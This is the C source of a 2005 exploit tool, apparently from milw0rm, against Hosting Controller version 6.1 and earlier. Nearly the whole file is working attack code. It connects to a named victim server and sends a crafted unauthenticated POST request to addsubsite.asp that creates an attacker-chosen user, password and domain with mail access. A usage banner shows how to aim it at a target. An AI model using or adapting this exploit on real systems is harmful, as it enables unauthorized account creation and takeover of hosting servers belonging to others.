/*****************************************************
*                                                    *
*  [Hosting Controller <= v6.1] exploit              *
*                                                    *
*  sileHOSTCxpl                                      *
*                                                    *
*  This exploit utilize two ways for exploiting      *
*  vulnerability present into Hosting Controller.    *
*  This exploit create new user with relative        *
*  passwd and registered your host with mail server  *
*  into Hosting Controller software ;\               *
*                                                    *
*  References: www.milw0rm.com/id.php?id=979         * 
*                                                    *
*  coded by: Silentium of Anacron Group Italy        *
*      date: 05/05/2005                              *
*    e-mail: anacrongroupitaly[at]autistici[dot]org  *
*   my_home: www.autistici.org/anacron.group-italy   *
*                                                    *
*  this tool is developed under GPL license          *
*  no(c) .:. copyleft                                *
*                                                    *
*****************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define PORT1 80		// port of web server 
#define PORT2 8077		// port of hosting controller

void info(void);
void banner(void);
void sendxpl(FILE *out, char *argv[], int type);
void errsock(void);
void errgeth(void);
void errconn(char *argv[]);


int main(int argc, char *argv[]){

FILE *out;
int sock, sockconn, type;
struct sockaddr_in addr;
struct hostent *hp;

type = atoi(argv[6]);

if(argc!=7 || (type < 1) || (type > 2))
   info();

banner();
   
if((sock = socket(AF_INET,SOCK_STREAM,0)) < 0)
   errsock();
   
   printf("[*] Creating socket		[OK]\n");

if((hp = gethostbyname(argv[1])) == NULL)
   errgeth();
   
   printf("[*] Resolving victim host	[OK]\n");
   
memset(&addr,0,sizeof(addr));
memcpy((char *)&addr.sin_addr,hp->h_addr,hp->h_length);
addr.sin_family = AF_INET;

if(type == 1)
   addr.sin_port = htons(PORT1);
else
   addr.sin_port = htons(PORT2);
   
sockconn = connect(sock,(struct sockaddr *)&addr,sizeof(addr));
if(sockconn < 0)
   errconn(argv);
   
   printf("[*] Connecting at victim host   [OK]\n");
   
out = fdopen(sock,"a");
setbuf(out,NULL);

sendxpl(out,argv,type);

if(type == 1)
   printf("[*] Now test your username and password\n" 
          "    on http://%s/admin/\n\n",argv[1]);
else
   printf("[*] Now test your username and password\n"
          "    on http://%s:8077\n\n",argv[1]);

shutdown(sock,2);
close(sock);

return 0;

}


void info(void){

system("clear");
printf("\n\t         #########################################\n"
       "\t         #             sileHOSTCxpl              #\n"
       "\t         #  ###################################  #\n"
       "\t         #          Hosting Controller           #\n"
       "\t         #           <= v6.1 exploit             #\n"
       "\t         #   Unauthenticated User Registration   #\n"
       "\t         #          coded by Silentium           #\n"            
       "\t         #        [ Anacron Group Italy ]        #\n"
       "\t         #  ###################################  #\n"
       "\t         # www.autistici.org/anacron-group-italy #\n"
       "\t         #########################################\n\n"
       " [Usage]\n\n" 
       "  sileHOSTCxpl <victim> <username> <password> <your_host> <mailserver> <type>\n\n"
       "        [Type]\n\n"
       "              1) web server daemon	   [port 80]\n"
       "              2) hosting controller daemon [port 8077]\n\n"
       " [Example]\n\n"
       "  sileHOSTCxpl www.victim.com sile silePass anacrongroup.org imail 1\n\n"); 
exit(1);

}


void banner(void){

system("clear");
printf("[-] sileHOSTCxpl\n"
       "    ============\n"
       "[-] Hosting Controller <= v6.1 exploit\n"
       "[-] coded by Silentium - Anacron Group Italy\n"
       "[-] www.autistici.org/anacron-group-italy\n\n");
       
}
       

void sendxpl(FILE *out, char *argv[], int type){

int size = 132;

size+=strlen(argv[2]);
size+=strlen(argv[3]);
size+=strlen(argv[4]);
size+=strlen(argv[5]);
    
if(type == 1)    
    fprintf(out,"POST /admin/hosting/addsubsite.asp HTTP/1.0\n"
                "Connection: Keep-Alive\n"
                "Pragma: no-cache\n"
                "Cache-control: no-cache\n"
                "Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\n"
                "Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\n"
                "Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\n"
                "Accept-Language: en\n"
                "Host: %s\n"
                "Content-Type: application/x-www-form-urlencoded\n"
                "Content-Length: %d\n\n"
                "reseller=resadmin&domaintypecheck=SECOND&DomainName=%s&loginname=%s&"
                "Quota=-1&htype=27&choice=1&mailaccess=TRUE&MailServerType=%s&password"
                "=%s",argv[1],size,argv[4],argv[2],argv[5],argv[3]); 
else
    fprintf(out,"POST /hosting/addsubsite.asp HTTP/1.0\n"
                "Connection: Keep-Alive\n"
                "Pragma: no-cache\n"
                "Cache-control: no-cache\n"
                "Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\n"
                "Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\n"
                "Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\n"
                "Accept-Language: en\n"
                "Host: %s\n"
                "Content-Type: application/x-www-form-urlencoded\n"
                "Content-Length: %d\n\n"
                "reseller=resadmin&domaintypecheck=SECOND&DomainName=%s&loginname=%s&"
                "Quota=-1&htype=27&choice=1&mailaccess=TRUE&MailServerType=%s&password"
                "=%s",argv[1],size,argv[4],argv[2],argv[5],argv[3]);
                                                                                                                                                                                                                                     
                                  
                 printf("[*] Sending exploit		[OK]\n\n");

}
            
                 
void errsock(void){

system("clear");
printf("[x] Creating socket	[FAILED]\n\n");
exit(1);

}


void errgeth(void){

printf("[x] Resolving victim host	[FAILED]\n\n");
exit(1);

}


void errconn(char *argv[]){

printf("[x] Connecting at victim host	[FAILED]\n\n",argv[1]);
exit(1);

}

// milw0rm.com [2005-05-07]
